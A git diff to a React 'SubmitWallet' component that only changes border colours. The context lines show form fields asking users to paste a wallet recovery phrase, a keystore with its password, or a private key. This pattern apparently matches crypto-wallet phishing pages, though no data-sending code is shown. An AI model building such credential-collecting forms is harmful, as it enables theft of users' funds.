@@ -55,7 +55,7 @@ const SubmitWallet = () => {
         <div className="flex justify-center gap-10 sm:gap-10 md:gap-20 lg:gap-20  md:mb-10 ">
           <button
             onClick={() => switchHandle(1)}
-            className={`border text-slate-50 border-[#1bbdfc] px-6 sm:px-5 md:px-10 lg:px-10 py-2  lg:w-[400px] rounded-full ${
+            className={`border text-slate-50 border-[#1bbcfcbe] px-6 sm:px-5 md:px-10 lg:px-10 py-2  lg:w-[400px] rounded-full ${
               current === 1 ? "bg-[#1bbdfc]" : ""
             }`}
           >
@@ -63,7 +63,7 @@ const SubmitWallet = () => {
           </button>
           <button
             onClick={() => switchHandle(2)}
-            className={`border text-slate-50 border-[#1bbdfc] px-6 sm:px-5 md:px-10 lg:px-10 py-2  lg:w-[400px] rounded-full ${
+            className={`border text-slate-50 border-[#1bbcfcbe] px-6 sm:px-5 md:px-10 lg:px-10 py-2  lg:w-[400px] rounded-full ${
               current === 2 ? "bg-[#1bbdfc] " : ""
             }`}
           >
@@ -71,7 +71,7 @@ const SubmitWallet = () => {
           </button>
           <button
             onClick={() => switchHandle(3)}
-            className={`border text-slate-50 border-[#1bbdfc] px-6 sm:px-5 md:px-10 lg:px-10 py-2  lg:w-[400px] rounded-full ${
+            className={`border text-slate-50 border-[#1bbcfcbe] px-6 sm:px-5 md:px-10 lg:px-10 py-2  lg:w-[400px] rounded-full ${
               current === 3 ? "bg-[#1bbdfc] " : ""
             }`}
           >
@@ -88,7 +88,7 @@ const SubmitWallet = () => {
                     value={enteredValue.phrase}
                     name="phrase"
                     onChange={onChangeHandle}
-                    className="w-[90%] h-[200px] rounded-lg border text-slate-100 bg-transparent  py-5 outline-0 px-6  border-[#1bbdfc] mb-7"
+                    className="w-[90%] h-[200px] rounded-lg border text-slate-100 bg-transparent  py-5 outline-0 px-6  border-[#1bbcfcbe] mb-7"
                     placeholder="Typically 12 (sometimes 24) words seperated by single spaces"
                   ></textarea>
                 </div>
@@ -100,7 +100,7 @@ const SubmitWallet = () => {
                     value={enteredValue.keystore}
                     onChange={onChangeHandle}
                     name="keystore"
-                    className="w-[90%] h-[200px] text-slate-100 bg-transparent  py-5 outline-0 px-6 rounded-lg border  border-[#1bbdfc] mb-5"
+                    className="w-[90%] h-[200px] text-slate-100 bg-transparent  py-5 outline-0 px-6 rounded-lg border  border-[#1bbcfcbe] mb-5"
                     placeholder="Several lines of text beginning with '(...)' plus the password you used to encypt it."
                   ></textarea>
                   <div>
@@ -108,7 +108,7 @@ const SubmitWallet = () => {
                       value={enteredValue.password}
                       onChange={onChangeHandle}
                       name="password"
-                      className="w-[90%] text-slate-100 bg-transparent py-5 outline-0 px-6     rounded-lg border mb-7 border-[#1bbdfc] "
+                      className="w-[90%] text-slate-100 bg-transparent py-5 outline-0 px-6     rounded-lg border mb-7 border-[#1bbcfcbe] "
                       type="text"
                       placeholder="Password"
                     />
@@ -123,7 +123,7 @@ const SubmitWallet = () => {
                     value={enteredValue.privateKey}
                     onChange={onChangeHandle}
                     name="privateKey"
-                    className="w-[90%] h-[200px] text-slate-100 bg-transparent rounded-lg border py-5 outline-0 px-6  border-[#1bbdfc] mb-7"
+                    className="w-[90%] h-[200px] text-slate-100 bg-transparent rounded-lg border py-5 outline-0 px-6  border-[#1bbcfcbe] mb-7"
                     placeholder="Typically 12 (sometimes 24) words seperated by single spaces."
                   ></textarea>
                 </div>
